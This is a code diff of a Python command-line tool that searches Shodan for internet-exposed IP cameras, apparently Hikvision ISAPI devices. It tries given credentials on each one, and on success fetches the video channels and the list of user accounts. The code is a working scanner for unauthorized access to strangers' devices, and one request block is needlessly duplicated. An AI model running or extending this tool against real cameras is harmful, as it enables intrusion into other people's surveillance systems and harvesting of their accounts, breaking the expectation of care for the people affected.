@@ -4,6 +4,7 @@ try:
     import shodan
     import requests
     import xmltodict
+    from requests.auth import HTTPDigestAuth
 
 except ImportError:
     print("Import Error!")
@@ -43,18 +44,36 @@ class Camera:
         except:
             return False
 
-    def check_security(self):
+    def get_cameras(self):
         response = requests.get(
-            f"http://{self.username}:{self.password}@{self.address}:{self.port}/ISAPI/Security/RTSPCertificate", verify=False, timeout=5)
+            f"http://{self.address}:{self.port}/ISAPI/System/Video/inputs/channels", verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))
 
-        if response.status_code != 200:
-            print("Error!")
-            print(response.text)
+        if response.status_code == 200:
+            dictionary = xmltodict.parse(response.text, dict_constructor=dict)
+            return dictionary
 
-            return False
+        response = requests.get(f"http://{self.address}:{self.port}/ISAPI/System/Video/inputs/channels",
+                                verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))
 
-        dictionary = xmltodict.parse(response.text, dict_constructor=dict)
-        print(dictionary)
+        if response.status_code == 200:
+            dictionary = xmltodict.parse(response.text, dict_constructor=dict)
+            return dictionary
+
+        response = requests.get(f"http://{self.address}:{self.port}/ISAPI/ContentMgmt/InputProxy/channels",
+                                verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))
+
+        if response.status_code == 200:
+            dictionary = xmltodict.parse(response.text, dict_constructor=dict)
+            return dictionary
+
+    def get_users(self):
+        response = requests.get(f"http://{self.address}:{self.port}/ISAPI/Security/users",
+                                verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))
+
+        if response.status_code == 200:
+            dictionary = xmltodict.parse(response.text, dict_constructor=dict)
+
+            return dictionary["UserList"]["User"]
 
 
 @click.group()
@@ -82,7 +101,8 @@ def search(shodan_key, query, username, password):
         if camera.check_creds(username, password):
             matches.append(camera)
 
-            camera.check_security()
+            # print(camera.get_cameras())
+            print(camera.get_users())
 
             print("|---> Success! Logged to system!")
 
@@ -90,7 +110,6 @@ def search(shodan_key, query, username, password):
 
     for camera in matches:
         print(f"{camera.address}:{camera.port}")
-        camera.check_security()
 
 
 if __name__ == "__main__":
